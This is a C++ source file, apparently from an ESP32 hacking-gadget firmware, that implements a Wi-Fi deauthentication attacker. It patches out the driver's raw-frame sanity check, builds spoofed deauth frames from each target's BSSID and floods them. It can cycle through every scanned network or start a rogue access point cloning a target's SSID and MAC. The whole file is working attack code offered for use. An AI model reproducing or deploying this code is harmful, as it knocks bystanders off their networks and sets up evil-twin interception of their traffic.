#include "Deauther.h"
#include "App.h"
#include <WiFi.h>
#include <esp_wifi.h>

// The bypass function for broadcast deauth
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// Deauthentication frame template
static const uint8_t deauth_frame_template[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

Deauther::Deauther() : 
    app_(nullptr),
    isActive_(false),
    isAttackPending_(false),
    currentTargetIndex_(-1),
    lastHopTime_(0),
    lastPacketSendTime_(0)
{}

void Deauther::setup(App* app) {
    app_ = app;
}

void Deauther::prepareAttack(DeauthMode mode, DeauthTarget target) {
    isAttackPending_ = true;
    currentConfig_.mode = mode;
    currentConfig_.target = target;
}

bool Deauther::start(const WifiNetworkInfo& targetNetwork) {
    if (isActive_ || !isAttackPending_) return false;

    currentConfig_.specific_target_info = targetNetwork;
    allTargets_.clear();
    allTargets_.push_back(targetNetwork);
    currentTargetIndex_ = 0;

    executeAttackForCurrentTarget();

    isActive_ = true;
    isAttackPending_ = false;
    return true;
}

bool Deauther::startAllAPs() {
    if (isActive_ || !isAttackPending_) return false;

    allTargets_ = app_->getWifiManager().getScannedNetworks();
    if (allTargets_.empty()) {
        isAttackPending_ = false;
        return false;
    }

    currentTargetIndex_ = -1;
    hopToNextTarget();

    isActive_ = true;
    isAttackPending_ = false;
    return true;
}

void Deauther::stop() {
    if (!isActive_) return;
    
    Serial.println("[DEAUTHER] Stopping attack.");
    isActive_ = false;
    isAttackPending_ = false;
    rfLock_.reset(); // This releases the hardware lock, which in turn calls WiFi.mode(WIFI_OFF), etc.
    allTargets_.clear();
    currentTargetIndex_ = -1;
    currentTargetSsid_ = "";
    app_->getHardwareManager().setPerformanceMode(false);
}

void Deauther::loop() {
    if (!isActive_) return;

    if (currentConfig_.target == DeauthTarget::ALL_APS) {
        if (millis() - lastHopTime_ > ALL_APS_HOP_INTERVAL_MS) {
            hopToNextTarget();
        }
    }
    
    if (currentConfig_.mode == DeauthMode::BROADCAST) {
        if (millis() - lastPacketSendTime_ > BROADCAST_PACKET_INTERVAL_MS) {
            sendBroadcastDeauthPacket();
            lastPacketSendTime_ = millis();
        }
    }
}

void Deauther::hopToNextTarget() {
    if (allTargets_.empty()) {
        stop();
        return;
    }
    
    // Release the previous lock before acquiring a new one.
    if (rfLock_) {
        rfLock_.reset();
    }
    
    currentTargetIndex_ = (currentTargetIndex_ + 1) % allTargets_.size();
    executeAttackForCurrentTarget();
    lastHopTime_ = millis();
}

void Deauther::executeAttackForCurrentTarget() {
    if (currentTargetIndex_ < 0 || currentTargetIndex_ >= allTargets_.size()) return;

    const WifiNetworkInfo& newTarget = allTargets_[currentTargetIndex_];
    currentTargetSsid_ = newTarget.ssid;
    app_->getHardwareManager().setPerformanceMode(true);

    if (currentConfig_.mode == DeauthMode::ROGUE_AP) {
        rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::ROGUE_AP);
        if (!rfLock_ || !rfLock_->isValid()) {
            Serial.printf("[DEAUTHER] Failed to acquire ROGUE_AP lock for %s.\n", newTarget.ssid);
            return;
        }
        Serial.printf("[DEAUTHER] Starting Rogue AP for %s on channel %d\n", newTarget.ssid, newTarget.channel);
        esp_wifi_set_mac(WIFI_IF_AP, (uint8_t*)newTarget.bssid);
        WiFi.softAP(newTarget.ssid, "dummypassword", newTarget.channel);

    } else if (currentConfig_.mode == DeauthMode::BROADCAST) {
        rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
        if (!rfLock_ || !rfLock_->isValid()) {
            Serial.printf("[DEAUTHER] Failed to acquire WIFI_PROMISCUOUS lock for %s.\n", newTarget.ssid);
            return;
        }
        Serial.printf("[DEAUTHER] Starting Broadcast Deauth for %s on channel %d\n", newTarget.ssid, newTarget.channel);
        esp_wifi_set_channel(newTarget.channel, WIFI_SECOND_CHAN_NONE);
        // The loop() will now handle sending the packets.
    }
}

void Deauther::sendBroadcastDeauthPacket() {
    if (currentTargetIndex_ < 0 || currentTargetIndex_ >= allTargets_.size()) return;
    
    const WifiNetworkInfo& currentTarget = allTargets_[currentTargetIndex_];
    uint8_t deauth_packet[sizeof(deauth_frame_template)];
    memcpy(deauth_packet, deauth_frame_template, sizeof(deauth_frame_template));
    
    memcpy(&deauth_packet[10], currentTarget.bssid, 6); // Source Address
    memcpy(&deauth_packet[16], currentTarget.bssid, 6); // BSSID
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
}

bool Deauther::isActive() const { return isActive_; }
bool Deauther::isAttackPending() const { return isAttackPending_; }
const DeauthConfig& Deauther::getPendingConfig() const { return currentConfig_; }
const std::string& Deauther::getCurrentTargetSsid() const { return currentTargetSsid_; }